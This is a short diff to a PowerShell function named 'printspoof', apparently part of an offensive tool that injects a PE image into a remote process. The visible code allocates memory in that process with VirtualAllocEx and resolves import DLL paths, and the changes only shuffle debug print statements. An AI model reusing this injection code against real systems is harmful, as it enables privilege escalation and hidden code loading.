@@ -1303,10 +1303,10 @@ function printspoof
         $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
 		
         $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
-	Write-Host $ImportDllPath
+
         $DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
         $RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
-	Write-Host $RImportDllPathPtr
+
         if ($RImportDllPathPtr -eq [IntPtr]::Zero)
         {
           Throw "Unable to allocate memory in the remote process"
@@ -1789,8 +1789,8 @@ function printspoof
 
             $ImportDllHandle = [IntPtr]::Zero
             $ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
-	    Write-Host $ImportDllPathPtr
             $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
+	    Write-Host "$ImportDllPath"
 	    Write-Host $ImportDllPath
 				
             if ($RemoteLoading -eq $true)
